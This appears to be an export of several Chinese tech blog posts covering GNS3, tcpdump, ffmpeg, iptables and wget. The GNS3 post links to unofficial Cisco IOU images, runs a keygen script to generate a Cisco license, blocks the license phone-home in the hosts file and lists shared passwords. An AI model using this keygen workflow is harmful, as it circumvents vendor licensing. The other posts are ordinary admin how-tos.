是一款用来模拟思科CCIE考试的模拟器，在1.x版本以后加入了IOU功能，能够模拟一些以前无法模拟的实验，对于学习路由交换来说是非常有帮助的，但是GN31.5.3使用IOU很麻烦，中文资料非常少，我这边自己借鉴了国外的一些英文资料和YouTube上看的视频教程整理一份，供各位使用","text":"GNS3 是一款用来模拟思科CCIE考试的模拟器，在1.x版本以后加入了IOU功能，能够模拟一些以前无法模拟的实验，对于学习路由交换来说是非常有帮助的，但是GN31.5.3使用IOU很麻烦，中文资料非常少，我这边自己借鉴了国外的一些英文资料和YouTube上看的视频教程整理一份，供各位使用 安装去GitHub下载https://github.com/GNS3/gns3-gui/releases 目前稳定版本是1.5.3 镜像文件根据你自己的实际情况下载virtualbox的还是VMware的，反正下载下来之后用虚拟机软件导入镜像打开就可以 国内镜像站国内使用又拍云CDN 加速下载ftp 地址： v0.ftp.upyun.comusername: gns3password:https://www.awen.me 配置1.打开虚拟机，你可以看到虚拟机的IP地址 然后通过浏览器打开http://192.168.80.128:3080/upload上传如图所示的一些文件 文件可以在我的百度网盘获取链接：http://pan.baidu.com/s/1skWYnWL 密码：9fim 其中 i86bi-linux-l2-adventerprisek9-15.1a.bin 是模拟switch的镜像 i86bi-linux-l3-adventerprisek9-15.2.4M1.bin 是模拟router的镜像 .iourc 是cisco的license CiscoIOUKeygen.py 用来计算cisco license的脚本 通过ssh工具连接虚拟机，ssh gns3@192.168.80.128 password:gns3 gns3@gns3vm:~$ cd /opt/ gns3/ lost+found/ gns3@gns3vm:~$ cd /opt/gns3/ images/ projects/ gns3@gns3vm:~$ cd /opt/gns3/images/IOU/ gns3@gns3vm:/opt/gns3/images/IOU$ ls CiscoIOUKeygen.py i86bi-linux-l2-adventerprisek9-15.1a.bin i86bi-linux-l3-adventerprisek9-15.2.4M1.bin CiscoIOUKeygen.py.md5sum i86bi-linux-l2-adventerprisek9-15.1a.bin.md5sum i86bi-linux-l3-adventerprisek9-15.2.4M1.bin.md5sum gns3@gns3vm:/opt/gns3/images/IOU$ python3 CiscoIOUKeygen.py ********************************************************************* Cisco IOU License Generator - Kal 2011, python port of 2006 C version Modified to work with python3 by c_d 2014 hostid=00000000, hostname=gns3vm, ioukey=25e Add the following text to ~/.iourc: [license] gns3vm = 73635fd3b0a13ad0; You can disable the phone home feature with something like: echo &apos;127.0.0.127 xml.cisco.com&apos; &gt;&gt; /etc/hosts将上面计算得到的 [license] gns3vm = 73635fd3b0a13ad0;内容保存在/home/gns3/.iourc文件中 启动gns3.选择edit–preferences–找到IOS on UNIX，如图所示，配置IOURC文件的路径 切换到IOU Devices，添加设备 OK,现在你可以拖动设备到工作台，然后启动了 视频教程","categories":[],"tags":[{"name":"Cisco","slug":"Cisco","permalink":"https://awen.me/tags/Cisco/"},{"name":"gns3","slug":"gns3","permalink":"https://awen.me/tags/gns3/"},{"name":"路由交换","slug":"路由交换","permalink":"https://awen.me/tags/%E8%B7%AF%E7%94%B1%E4%BA%A4%E6%8D%A2/"}]},{"title":"mac 抓iPhone 的数据包","slug":"mac-抓iPhone-的数据包","date":"2017-06-15T05:28:25.000Z","updated":"2021-02-26T06:05:29.277Z","comments":true,"path":"posts/2288947203.html","link":"","permalink":"https://awen.me/posts/2288947203.html","excerpt":"获取 UUID1.首先，使用数据线连接 iPhone 和 mac 笔记本，启动iTunes,在电话号码下多点几次切换到 UUID 然后右键拷贝","text":"获取 UUID1.首先，使用数据线连接 iPhone 和 mac 笔记本，启动iTunes,在电话号码下多点几次切换到 UUID 然后右键拷贝 使用 rvictl12345678910111213➜ ~ rvictl --helprvictl: illegal option -- -rvictl [-h][-l][-s &lt;udid1&gt; ... &lt;udidN&gt;][-x &lt;udid1&gt; ... &lt;udidN&gt;]Remote Virtual Interface Tool starts and stops a remote packet capture instancefor any set of attached mobile devices. It can also provide feedback on any attacheddevices that are currently relaying packets back to this host.Options: -l, -L List currently active devices -s, -S Start a device or set of devices -x, -X Stop a device or set of devices 使用方法 使用 rvictl -s UUID 创建一个虚拟的网卡接口 rvi[number] number 为数字，默认是0，即 rvi0 提示[SUCCEEDED] with interface rvi0 创建成功 然后启动 tcpdump 或运行 wireshark 就可以看见 rvi0的接口。","categories":[],"tags":[{"name":"mac技巧","slug":"mac技巧","permalink":"https://awen.me/tags/mac%E6%8A%80%E5%B7%A7/"}]},{"title":"tcpdump 抓包分析","slug":"tcpdump-抓包分析","date":"2017-06-15T05:27:47.000Z","updated":"2021-02-26T06:05:29.292Z","comments":true,"path":"posts/3327466362.html","link":"","permalink":"https://awen.me/posts/3327466362.html","excerpt":"tcpdump 是一款开源的命令行数据包分析获取软件，它有着丰富的功能，通常我们在 linux 服务器上使用他进行网络故障的分析，可以输出 wireshark 支持的 cap 文件打开查看。","text":"tcpdump 是一款开源的命令行数据包分析获取软件，它有着丰富的功能，通常我们在 linux 服务器上使用他进行网络故障的分析，可以输出 wireshark 支持的 cap 文件打开查看。 tcpdump可以指定关键字加各种条件判断进行过滤。 第一种是关于类型的关键字，主要包括host，net，port, 例如 host 210.27.48.2，指明 210.27.48.2是一台主机，net 202.0.0.0 指明 202.0.0.0是一个网络地址，port 23 指明端口号是23。如果没有指定类型，缺省的类型是host. 第二种是确定传输方向的关键字，主要包括src , dst ,dst or src, dst and src ,这些关键字指明了传输的方向。举例说明，src 210.27.48.2 ,指明ip包中源地址是210.27.48.2 , dst net 202.0.0.0 指明目的网络地址是202.0.0.0 。如果没有指明方向关键字，则缺省是src or dst关键字。 第三种是协议的关键字，主要包括fddi,ip,arp,rarp,tcp,udp等类型。Fddi指明是在FDDI(分布式光纤数据接口网络)上的特定 的网络协议，实际上它是”ether”的别名，fddi和ether具有类似的源地址和目的地址，所以可以将fddi协议包当作ether的包进行处理和 分析。其他的几个关键字就是指明了监听的包的协议内容。如果没有指定任何协议，则tcpdump将会监听所有协议的信息包。 除了这三种类型的关键字之外，其他重要的关键字如下：gateway, broadcast,less,greater,还有三种逻辑运算，取非运算是 ‘not ‘ ‘! ‘, 与运算是’and’,’&amp;&amp;;或运算 是’or’ ,’||’；这些关键字可以组合起来构成强大的组合条件来满足人们的需要。 安装1.centos yum -y install tcpdump2.ubuntu sudo apt-get install tcpdump案例tcpdump -i eth1 -c 10-i 指定接口-c 只打印10个数据包 其中 10 packets captured 表示捕捉数据包的数量10 packets received by filter 过滤后所得的报数0 packets dropped by kernel 被内核丢弃的包数量 tcpdump -i eth1 -c 10 host 115.231.100.10host ip_address 只输出指定 host 的数据包 tcpdump -i eth1 -c 10 host 115.231.100.10 -s0 -w /home/fangwenjun/tcp.pcap保存为 wireshark 可以打开的格式，-s0 表示输出完整的报文头 tcpdump host 210.27.48.1 and / (210.27.48.2 or 210.27.48.3 /)截取 210.27.48.1 210.27.48.2 210.27.48.3 的数据包 tcpdump -i eth1 host 115.231.100.10 -s0 -c 100 and tcp port 80 or 443打印指定host 的80和443端口的数据包 17:05:26.738783 IP spider-141-8-142-49.yandex.com.44018 &gt; 121.42.148.6.https: Flags [.], ack 1466937074, win 122, options [nop,nop,TS val 3216080543 ecr 96181242], length 0 17:05:26.738831 IP spider-141-8-142-49.yandex.com.44018 &gt; 121.42.148.6.https: Flags [.], ack 1399, win 132, options [nop,nop,TS val 3216080543 ecr 96181242], length 0 17:05:26.738839 IP spider-141-8-142-49.yandex.com.44018 &gt; 121.42.148.6.https: Flags [.], ack 1510, win 132, options [nop,nop,TS val 3216080543 ecr 96181242], length 0如果加上-nn 参数则不会解析常用端口所对应的协议，例如 http 会变成80 https 会变成443 tcpdump -i eth1 host 115.231.100.10 -s0 -c 100 and tcp port 80 or 443 -nn tcpdump -i eth1 host 115.231.100.10 -s0 -c 100 and tcp port 80 or 443 -nn -q-q 参数会显示比较短的数据包信息，如下 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes 17:11:03.670618 IP 115.231.100.10.62036 &gt; 121.42.148.6.443: tcp 77 17:11:03.670670 IP 121.42.148.6.443 &gt; 115.231.100.10.62036: tcp 0 17:11:03.670681 IP 115.231.100.10.62036 &gt; 121.42.148.6.443: tcp 46 17:11:03.670687 IP 121.42.148.6.443 &gt; 115.231.100.10.62036: tcp 0 17:11:03.670956 IP 121.42.148.6.443 &gt; 115.231.100.10.62036: tcp 46 17:11:03.698967 IP 115.231.100.10.62036 &gt; 121.42.148.6.443: tcp 0然后，我们看-e 参数 tcpdump -i eth1 host 115.231.100.10 -s0 -c 100 and tcp port 80 or 443 -nn -qe-e 参数会使用二层的 mac 地址输出信息，例如 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes 17:13:53.002550 ee:ff:ff:ff:ff:ff &gt; 00:16:3e:00:29:6d, IPv4, length 143: 115.231.100.10.62036 &gt; 121.42.148.6.443: tcp 77 17:13:53.002731 ee:ff:ff:ff:ff:ff &gt; 00:16:3e:00:29:6d, IPv4, length 112: 115.231.100.10.62036 &gt; 121.42.148.6443: tcp 46我们继续看 tcpdump -i eth1 host 115.231.100.106 -s0 -c 10 and tcp port 80 or 443 -nn -X-X参数，会打印16位进制（hex）以及 ASCII 的封包內容","categories":[],"tags":[{"name":"tcpdump","slug":"tcpdump","permalink":"https://awen.me/tags/tcpdump/"}]},{"title":"使用ffmpeg 设置水印的位置","slug":"使用ffmpeg-设置水印的位置","date":"2017-06-15T05:25:34.000Z","updated":"2021-02-26T06:05:29.309Z","comments":true,"path":"posts/1416758927.html","link":"","permalink":"https://awen.me/posts/1416758927.html","excerpt":"水印在左上角：ffmpeg -i gopro.mp4 -i 168-50.png -filter_complex &quot;overlay=10:10&quot; -codec:a copy output.mp4 其中10：10 可以指定 x、y 坐标的位置","text":"水印在左上角：ffmpeg -i gopro.mp4 -i 168-50.png -filter_complex &quot;overlay=10:10&quot; -codec:a copy output.mp4 其中10：10 可以指定 x、y 坐标的位置 具体如下： ➜ Downloads ffmpeg -i gopro.mp4 -i 168-50.png -filter_complex &quot;overlay=main_w-overlay_w-20:20&quot; -codec:a copy output.mp4 ffmpeg version 3.2.4 Copyright (c) 2000-2017 the FFmpeg developers built with Apple LLVM version 8.1.0 (clang-802.0.38) configuration: --prefix=/usr/local/Cellar/ffmpeg/3.2.4 --enable-shared --enable-pthreads --enable-gpl --enable-version3 --enable-hardcoded-tables --enable-avresample --cc=clang --host-cflags= --host-ldflags= --enable-ffplay --enable-libmp3lame --enable-libx264 --enable-libxvid --enable-opencl --disable-lzma --enable-vda libavutil 55. 34.101 / 55. 34.101 libavcodec 57. 64.101 / 57. 64.101 libavformat 57. 56.101 / 57. 56.101 libavdevice 57. 1.100 / 57. 1.100 libavfilter 6. 65.100 / 6. 65.100 libavresample 3. 1. 0 / 3. 1. 0 libswscale 4. 2.100 / 4. 2.100 libswresample 2. 3.100 / 2. 3.100 libpostproc 54. 1.100 / 54. 1.100 Input #0, mov,mp4,m4a,3gp,3g2,mj2, from &apos;gopro.mp4&apos;: Metadata: major_brand : isom minor_version : 512 compatible_brands: isomiso2avc1mp41 encoder : Lavf57.25.100 Duration: 00:04:13.98, start: 0.000000, bitrate: 2610 kb/s Stream #0:0(und): Video: h264 (High) (avc1 / 0x31637661), yuv420p, 1280x720 [SAR 1:1 DAR 16:9], 2474 kb/s, 29.97 fps, 29.97 tbr, 30k tbn, 59.94 tbc (default) Metadata: handler_name : VideoHandler Stream #0:1(und): Audio: aac (LC) (mp4a / 0x6134706D), 44100 Hz, stereo, fltp, 128 kb/s (default) Metadata: handler_name : SoundHandler Input #1, png_pipe, from &apos;168-50.png&apos;: Duration: N/A, bitrate: N/A Stream #1:0: Video: png, rgba(pc), 168x50 [SAR 5669:5669 DAR 84:25], 25 tbr, 25 tbn, 25 tbc File &apos;output.mp4&apos; already exists. Overwrite ? [y/N] y 输入 y 继续 [libx264 @ 0x7fbac900c400] using SAR=1/1 [libx264 @ 0x7fbac900c400] using cpu capabilities: MMX2 SSE2Fast SSSE3 SSE4.2 AVX FMA3 AVX2 LZCNT BMI2 [libx264 @ 0x7fbac900c400] profile High, level 3.1 [libx264 @ 0x7fbac900c400] 264 - core 148 r2748 97eaef2 - H.264/MPEG-4 AVC codec - Copyleft 2003-2016 - http://www.videolan.org/x264.html - options: cabac=1 ref=3 deblock=1:0:0 analyse=0x3:0x113 me=hex subme=7 psy=1 psy_rd=1.00:0.00 mixed_ref=1 me_range=16 chroma_me=1 trellis=1 8x8dct=1 cqm=0 deadzone=21,11 fast_pskip=1 chroma_qp_offset=-2 threads=6 lookahead_threads=1 sliced_threads=0 nr=0 decimate=1 interlaced=0 bluray_compat=0 constrained_intra=0 bframes=3 b_pyramid=2 b_adapt=1 b_bias=0 direct=1 weightb=1 open_gop=0 weightp=2 keyint=250 keyint_min=25 scenecut=40 intra_refresh=0 rc_lookahead=40 rc=crf mbtree=1 crf=23.0 qcomp=0.60 qpmin=0 qpmax=69 qpstep=4 ip_ratio=1.40 aq=1:1.00 Output #0, mp4, to &apos;output.mp4&apos;: Metadata: major_brand : isom minor_version : 512 compatible_brands: isomiso2avc1mp41 encoder : Lavf57.56.101 Stream #0:0: Video: h264 (libx264) ([33][0][0][0] / 0x0021), yuv420p, 1280x720 [SAR 1:1 DAR 16:9], q=-1--1, 29.97 fps, 30k tbn, 29.97 tbc (default) Metadata: encoder : Lavc57.64.101 libx264 Side data: cpb: bitrate max/min/avg: 0/0/0 buffer size: 0 vbv_delay: -1 Stream #0:1(und): Audio: aac (LC) ([64][0][0][0] / 0x0040), 44100 Hz, stereo, 128 kb/s (default) Metadata: handler_name : SoundHandler Stream mapping: Stream #0:0 (h264) -&gt; overlay:main Stream #1:0 (png) -&gt; overlay:overlay overlay -&gt; Stream #0:0 (libx264) Stream #0:1 -&gt; #0:1 (copy) Press [q] to stop, [?] for help frame= 7610 fps= 36 q=-1.0 Lsize= 77794kB time=00:04:13.93 bitrate=2509.7kbits/s speed=1.19x video:73560kB audio:3970kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: 0.340952% [libx264 @ 0x7fbac900c400] frame I:125 Avg QP:19.08 size: 58060 [libx264 @ 0x7fbac900c400] frame P:2658 Avg QP:22.50 size: 15608 [libx264 @ 0x7fbac900c400] frame B:4827 Avg QP:24.71 size: 5507 [libx264 @ 0x7fbac900c400] consecutive B-frames: 6.7% 18.7% 22.4% 52.2% [libx264 @ 0x7fbac900c400] mb I I16..4: 23.2% 43.3% 33.5% [libx264 @ 0x7fbac900c400] mb P I16..4: 6.5% 15.0% 3.2% P16..4: 32.5% 9.7% 3.8% 0.0% 0.0% skip:29.3% [libx264 @ 0x7fbac900c400] mb B I16..4: 1.1% 2.6% 0.8% B16..8: 31.4% 4.2% 0.8% direct: 1.6% skip:57.6% L0:44.2% L1:49.6% BI: 6.2% [libx264 @ 0x7fbac900c400] 8x8 transform intra:57.9% inter:64.8% [libx264 @ 0x7fbac900c400] coded y,uvDC,uvAC intra: 41.4% 44.0% 9.7% inter: 8.7% 8.6% 0.4% [libx264 @ 0x7fbac900c400] i16 v,h,dc,p: 19% 32% 13% 36% [libx264 @ 0x7fbac900c400] i8 v,h,dc,ddl,ddr,vr,hd,vl,hu: 23% 25% 24% 4% 5% 4% 6% 4% 6% [libx264 @ 0x7fbac900c400] i4 v,h,dc,ddl,ddr,vr,hd,vl,hu: 21% 23% 16% 6% 8% 7% 8% 5% 7% [libx264 @ 0x7fbac900c400] i8c dc,h,v,p: 58% 23% 15% 5% [libx264 @ 0x7fbac900c400] Weighted P-Frames: Y:8.4% UV:4.1% [libx264 @ 0x7fbac900c400] ref P L0: 66.7% 18.0% 10.7% 4.3% 0.3% [libx264 @ 0x7fbac900c400] ref B L0: 88.5% 9.6% 1.8% [libx264 @ 0x7fbac900c400] ref B L1: 98.3% 1.7% [libx264 @ 0x7fbac900c400] kb/s:2373.17水印在右上角：ffmpeg -i gopro.mp4 -i 168-50.png -filter_complex &quot;overlay=main_w-overlay_w-10:10&quot; -codec:a copy output.mp4 水印在左下角：ffmpeg -i gopro.mp4 -i 168-50.png -filter_complex &quot;overlay=10:main_h-overlay_h-10“ -codec:a copy output.mp4水印在右下角：ffmpeg -i gopro.mp4 -i 168-50.png -filter_complex &quot;overlay=main_w-overlay_w-10:main_h-overlay_h-10“ -codec:a copy output.mp4水印在中间：ffmpeg -i gopro.mp4 -i 168-50.png -filter_complex &quot;overlay=main_w/2-overlay_w/2:main_h/2-overlay_h/2“ -codec:a copy output.mp4播放➜ Downloads ffplay gopro.mp4 ffplay version 3.2.4 Copyright (c) 2003-2017 the FFmpeg developers built with Apple LLVM version 8.1.0 (clang-802.0.38) configuration: --prefix=/usr/local/Cellar/ffmpeg/3.2.4 --enable-shared --enable-pthreads --enable-gpl --enable-version3 --enable-hardcoded-tables --enable-avresample --cc=clang --host-cflags= --host-ldflags= --enable-ffplay --enable-libmp3lame --enable-libx264 --enable-libxvid --enable-opencl --disable-lzma --enable-vda libavutil 55. 34.101 / 55. 34.101 libavcodec 57. 64.101 / 57. 64.101 libavformat 57. 56.101 / 57. 56.101 libavdevice 57. 1.100 / 57. 1.100 libavfilter 6. 65.100 / 6. 65.100 libavresample 3. 1. 0 / 3. 1. 0 libswscale 4. 2.100 / 4. 2.100 libswresample 2. 3.100 / 2. 3.100 libpostproc 54. 1.100 / 54. 1.100 Input #0, mov,mp4,m4a,3gp,3g2,mj2, from &apos;gopro.mp4&apos;: Metadata: major_brand : isom minor_version : 512 compatible_brands: isomiso2avc1mp41 encoder : Lavf57.25.100 Duration: 00:04:13.98, start: 0.000000, bitrate: 2610 kb/s Stream #0:0(und): Video: h264 (High) (avc1 / 0x31637661), yuv420p, 1280x720 [SAR 1:1 DAR 16:9], 2474 kb/s, 29.97 fps, 29.97 tbr, 30k tbn, 59.94 tbc (default) Metadata: handler_name : VideoHandler Stream #0:1(und): Audio: aac (LC) (mp4a / 0x6134706D), 44100 Hz, stereo, fltp, 128 kb/s (default) Metadata: handler_name : SoundHandler 12.36 A-V: -0.008 fd= 36 aq= 19KB vq= 69KB sq= 0B f=0/0","categories":[],"tags":[{"name":"ffmpeg","slug":"ffmpeg","permalink":"https://awen.me/tags/ffmpeg/"}]},{"title":"使用 ffmpeg  截图和转码","slug":"使用-ffmpeg-截图和转码","date":"2017-06-15T05:24:46.000Z","updated":"2021-02-26T06:05:29.304Z","comments":true,"path":"posts/3387824189.html","link":"","permalink":"https://awen.me/posts/3387824189.html","excerpt":"剪辑视频ffmpeg -ss 00:00:00 -t 00:00:09 -y -i gopro.mp4 -vcodec copy -acodec copy test1.mp4","text":"剪辑视频ffmpeg -ss 00:00:00 -t 00:00:09 -y -i gopro.mp4 -vcodec copy -acodec copy test1.mp4 说明：上面的这个例子是将gopro.mp4视频的前9秒，重新生成一个新视频。-ss 开始时间，如： 00:00:00，表示从0秒开始，格式也可以00:00:0-t 时长，如： 00:00:09，表示截取3秒长的视频，格式也可以00:00: 9-y 如果文件已存在强制替换；-i 输入，后面是空格，紧跟着就是输入视频文件；-vcodec copy 和 -acodec copy表示所要使用的视频和音频的编码格式，这里指定为copy表示原样拷贝； ![09.png][1] 转码1.将文件 gorpo.mp4 转换成 out.m3u8 ffmpeg -i gopro.mp4 -vcodec copy -acodec copy out.m3u8截图 每10秒截图一次 ffmpeg -i gopro.mp4 -f image2 -vf fps=fps=1/10 out%d.png 2.每秒截图一次 ffmpeg -i gopro.mp4 -f image2 -vf fps=fps=1 out%d.png3.从第10秒开始截图100张 保存大小为1280*720 保存格式为 b-时间.JPG ffmpeg -ss 10 -i gopro.mp4 -y -f image2 -vframes 100 -s 1280x720 b-%d.jpg!awen)","categories":[],"tags":[{"name":"ffmpeg","slug":"ffmpeg","permalink":"https://awen.me/tags/ffmpeg/"}]},{"title":"使用 ffplay 指定http header播放视频","slug":"使用-ffplay-指定http-header播放视频","date":"2017-06-15T05:21:55.000Z","updated":"2021-02-26T06:05:29.304Z","comments":true,"path":"posts/1895316841.html","link":"","permalink":"https://awen.me/posts/1895316841.html","excerpt":"在给客户进行故障排查时，使用 ffplay 去播放，希望看播放视频的分辨率，发现客户设置了 referer 防盗链，直接访问返回 http 状态码403。之前都是直接用 ffplay 来进行播放的，查了下帮助文档，发现参数太大，于是使用 grep 打法过滤了下发现可以指定–headers 来进行自定义 http 请求头。","text":"在给客户进行故障排查时，使用 ffplay 去播放，希望看播放视频的分辨率，发现客户设置了 referer 防盗链，直接访问返回 http 状态码403。之前都是直接用 ffplay 来进行播放的，查了下帮助文档，发现参数太大，于是使用 grep 打法过滤了下发现可以指定–headers 来进行自定义 http 请求头。 ➜ ~ ffplay --help | grep &apos;HTTP&apos; ffplay version 3.3 Copyright (c) 2003-2017 the FFmpeg developers built with Apple LLVM version 8.1.0 (clang-802.0.42) configuration: --prefix=/usr/local/Cellar/ffmpeg/3.3 --enable-shared --enable-pthreads --enable-gpl --enable-version3 --enable-hardcoded-tables --enable-avresample --cc=clang --host-cflags= --host-ldflags= --enable-libmp3lame --enable-libx264 --enable-libx265 --enable-libxvid --enable-opencl --disable-lzma --enable-vda libavutil 55. 58.100 / 55. 58.100 libavcodec 57. 89.100 / 57. 89.100 libavformat 57. 71.100 / 57. 71.100 libavdevice 57. 6.100 / 57. 6.100 libavfilter 6. 82.100 / 6. 82.100 libavresample 3. 5. 0 / 3. 5. 0 libswscale 4. 6.100 / 4. 6.100 libswresample 2. 7.100 / 2. 7.100 libpostproc 54. 5.100 / 54. 5.100 -ffrtmphttp_tls &lt;boolean&gt; .D...... Use a HTTPS tunneling connection (RTMPTS). (default false) -http_proxy &lt;string&gt; ED...... set HTTP proxy to tunnel through -headers &lt;string&gt; ED...... set custom HTTP headers, can override built in default headers -post_data &lt;binary&gt; ED...... set custom HTTP post data -cookies &lt;string&gt; .D...... set cookies to be sent in applicable future requests, use newline delimited Set-Cookie HTTP field value syntax -auth_type &lt;int&gt; ED...... HTTP authentication type (from 0 to 1) (default none) basic ED...... HTTP basic authentication -method &lt;string&gt; ED...... Override the HTTP method or set the expected HTTP method from a client -listen &lt;int&gt; ED...... listen on HTTP (from 0 to 2) (default 0) -http_proxy &lt;string&gt; ED...... set HTTP proxy to tunnel through -headers &lt;string&gt; ED...... set custom HTTP headers, can override built in default headers -post_data &lt;binary&gt; ED...... set custom HTTP post data -cookies &lt;string&gt; .D...... set cookies to be sent in applicable future requests, use newline delimited Set-Cookie HTTP field value syntax -auth_type &lt;int&gt; ED...... HTTP authentication type (from 0 to 1) (default none) basic ED...... HTTP basic authentication -method &lt;string&gt; ED...... Override the HTTP method or set the expected HTTP method from a client -listen &lt;int&gt; ED...... listen on HTTP (from 0 to 2) (default 0) http .D...... HTTP tunneling http .D...... HTTP tunneling其中的 -headers &lt;string&gt; ED...... set custom HTTP headers, can override built in default headers就是我们想要的了，知道了用什么就好办了，直接 ➜ ~ ffplay -headers &apos;referer:xxx.cn&apos; http://xxxxx/a/11.m3u8 ffplay version 3.3 Copyright (c) 2003-2017 the FFmpeg developers built with Apple LLVM version 8.1.0 (clang-802.0.42) configuration: --prefix=/usr/local/Cellar/ffmpeg/3.3 --enable-shared --enable-pthreads --enable-gpl --enable-version3 --enable-hardcoded-tables --enable-avresample --cc=clang --host-cflags= --host-ldflags= --enable-libmp3lame --enable-libx264 --enable-libx265 --enable-libxvid --enable-opencl --disable-lzma --enable-vda libavutil 55. 58.100 / 55. 58.100 libavcodec 57. 89.100 / 57. 89.100 libavformat 57. 71.100 / 57. 71.100 libavdevice 57. 6.100 / 57. 6.100 libavfilter 6. 82.100 / 6. 82.100 libavresample 3. 5. 0 / 3. 5. 0 libswscale 4. 6.100 / 4. 6.100 libswresample 2. 7.100 / 2. 7.100 libpostproc 54. 5.100 / 54. 5.100 [http @ 0x7fd5b2d93320] No trailing CRLF found in HTTP header. Input #0, hls,applehttp, from &apos;http://xxxxx/a/11.m3u8&apos;:B f=0/0 Duration: 00:08:25.90, start: 1.466667, bitrate: 0 kb/s Program 0 Metadata: variant_bitrate : 0 Stream #0:0: Video: h264 (High) ([27][0][0][0] / 0x001B), yuv420p, 720x1280 [SAR 1:1 DAR 9:16], 30 fps, 30 tbr, 90k tbn, 60 tbc Metadata: variant_bitrate : 0 Stream #0:1: Audio: aac (LC) ([15][0][0][0] / 0x000F), 44100 Hz, mono, fltp Metadata: variant_bitrate : 0 3.68 A-V: -0.034 fd= 0 aq= 13KB vq= 126KB sq= 0B f=0/0其中这段显示的是客户改视频文件视频的编码方式是 H264,yuv420p是使用的颜色空间其中，Y表示亮度，而U，V则与颜色相关，而420则分别对应着存储相应分量所占用的比特数之，720x1280是视频的分辨率，[SAR 1:1 DAR 9:16]是视频的大小是16比9，30 fps 就是帧率咯，tbr, 90k tbn, 60 tbc 这是表示在相应层上的时间单元，比如tbn=2997就相当于在视频流层把1s的时间分成了2997个时间单元，如此精细可以更好的与其他流比如音频流同步，对应着fps=29.97就表示每100个时间单元中有一帧。 Stream #0:0: Video: h264 (High) ([27][0][0][0] / 0x001B), yuv420p, 720x1280 [SAR 1:1 DAR 9:16], 30 fps, 30 tbr, 90k tbn, 60 tbc对于多媒体这块了解不多，也就是在处理 cdn 问题的时候稍微了解下。","categories":[],"tags":[{"name":"ffplay","slug":"ffplay","permalink":"https://awen.me/tags/ffplay/"}]},{"title":"iptables 的 DROP和reject的区别","slug":"iptables-的-DROP和reject的区别","date":"2017-06-15T05:20:10.000Z","updated":"2021-02-26T06:05:29.274Z","comments":true,"path":"posts/1261407699.html","link":"","permalink":"https://awen.me/posts/1261407699.html","excerpt":"在学习iptables的时候，我们知iptables在处理数据包的时候，常用的方式有ACCEPT\\DROP\\REJECT。ACCEPT这个很好理解，可是DROP和REJECT都是拒绝。这两个的区别是什么呢？带着这个问题。我配置了两种方式，通过抓取数据包来分析查看下他们的区别。","text":"在学习iptables的时候，我们知iptables在处理数据包的时候，常用的方式有ACCEPT\\DROP\\REJECT。ACCEPT这个很好理解，可是DROP和REJECT都是拒绝。这两个的区别是什么呢？带着这个问题。我配置了两种方式，通过抓取数据包来分析查看下他们的区别。 案例最近全球范围内遭遇大规模的勒索敲诈木马病毒的攻击，黑客利用NSA 黑客武器库的工具进行了变种。专门针对windows操作系统的文件共享服务（samba）服务的远程代码植入漏洞进行攻击。samba服务的端口是139和445，其中445端口是用来进行数据传输的。黑客利用这个漏洞可以攻击任意开启该服务的windows漏洞，并通过非对称加密技术对系统内所有文件进行加密。以目前的技术是根本没什么办法对数据进行恢复的。其实早在今年年初，微软就发布了该漏洞的补丁，但由于国内你懂的原因，大部分使用Windows的都是盗版，这其中包括一些学校和企业，所以。一般这类系统都是禁止Windows更新的。当然，如果是正版的，没有打补丁，也会遭遇该木马病毒的攻击。 好了。以上面这个案例，我们要在Linux上通过iptables 对445端口进行禁止，谈一谈DROP和reject的区别 DROP1.我们直接在Linux主机上输入 root@raspberrypi:/home/pi# iptables -A INPUT -p tcp --dport 445 -j DROP 2.然后通过telnet 445端口，并且抓包 我们发现，DROP后，连接Linux主机，目标主机没有任何数据包的回复，客户端发起了SYN，然后就没有然后了。 REJECT我们删除DROP规则 root@raspberrypi:/home/pi# iptables -D INPUT -p tcp --dport 445 -j DROP 改成 root@raspberrypi:/home/pi# iptables -A INPUT -p tcp --dport 445 -j REJECT 然后再次通过telnel 445端口，进行抓包，我们发现客户端在于服务器直接还有几个ICMP的包，虽然是目标主机不可达。 从上述对比中我们可以很明显的看出了区别，那么什么时候会用DROP 什么时候用REJECT呢？其实对于到底是使用DROP还是REJECT，从很久以前开始就非常多的人提出这方面的疑问。REJECT其实就比DROP多返回一个ICMP错误信息包，两个策略各有优劣，简单总结如下：DROP比REJECT好在节省资源，而且延缓黑客攻击的进度（因为不会给黑客返回任何有关服务器的信息）；坏在容易让企业的网络问题难以排查，而且在DDoS攻击的情况容易耗尽所有的带宽。REJECT比DROP的好处在于容易诊断和调试网络设备或防火墙造成的问题；坏处上面也说了，你给骗子回个电话，相当于暴露了自己的服务器信息。所以一般的建议是在上游防火墙中使用REJECT，在比较危险的面向外网的基础防火墙上，使用DROP要相对安全一些。 写在后面上面所说的漏洞，对于Linux主机没有影响，不过如果希望禁止samba服务，可以 -A INPUT -p tcp -m tcp --dport 135:139 -j DROP -A INPUT -p tcp -m tcp --dport 445 -j DROP对于Windows主机，可以打开控制面板，找到防火墙，添加入站规则，阻止端口的数据通信。","categories":[],"tags":[{"name":"iptables","slug":"iptables","permalink":"https://awen.me/tags/iptables/"}]},{"title":"wget 提示unable to resolve host address的原因","slug":"wget-提示unable-to-resolve-host-address的原因","date":"2017-06-15T05:18:44.000Z","updated":"2021-02-26T06:05:29.293Z","comments":true,"path":"posts/1207247749.html","link":"","permalink":"https://awen.me/posts/1207247749.html","excerpt":"","text":"下载 nginx 报错[root@CTN-QD-247 ~]# wget -c http://nginx.org/download/nginx-1.12.0.tar.gz --2017-05-09 12:37:18-- http://nginx.org/download/nginx-1.12.0.tar.gz Resolving nginx.org... failed: Temporary failure in name resolution. wget: unable to resolve host address “nginx.org”原因检查 iptables 发现没放行53端口 [root@CTN-QD-247 ~]# iptables -A INPUT -p tcp --dport 53 -j ACCEPT [root@CTN-QD-247 ~]# iptables -A INPUT -p udp --sport 53 -j ACCEPT [root@CTN-QD-247 ~]# iptables -A INPUT -p tcp --sport 53 -j ACCEPT [root@CTN-QD-247 ~]# iptables -A INPUT -p udp --dport 53 -j ACCEPT","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"使用 autofs 自动挂载 